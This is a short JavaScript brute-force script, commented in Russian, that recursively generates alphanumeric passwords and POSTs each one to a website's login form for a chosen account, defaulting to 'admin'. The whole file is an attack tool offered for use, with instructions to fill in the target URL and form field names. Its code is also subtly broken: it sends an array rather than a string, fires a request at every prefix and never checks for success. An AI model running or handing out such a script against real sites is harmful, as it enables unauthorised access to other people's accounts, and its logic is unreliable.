/*
Необходимо выполнить попытку входа через форму логина на сайте, для определения url и полей логина/пароля на сайте
После - изменить глобальные переменные "urlV" и "loginV" и имена полей в body POST-запроса
Вызвать функцию comb
*/
urlV='123' // Введите url до формы логина (например, `http://localhost:8080/api/account/`) 
loginV='admin' // Введите логин аккаунта

// функция отправки POST-запроса к ресурсу
function post_r(url, login, password){
  return fetch(url, {
      method: 'POST',
      headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: `username=${login}&password=${password}` //изменить имена полей при необходимости
  })
  .then(response => response.url)
}

str_comb=[] // Начальный пустой массив для перебора паролей
chars='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

function comb(len, toBorder, step){
  if(step===len){
    for(let i=0; i<len; i++)
      console.log(str_comb.join(''));
    return;
  }
  for(let i=0; i<toBorder; i++){
    str_comb[step]=chars[i];
    post_r(urlV,loginV,str_comb)
    comb(len, toBorder, step+1);
  }
}
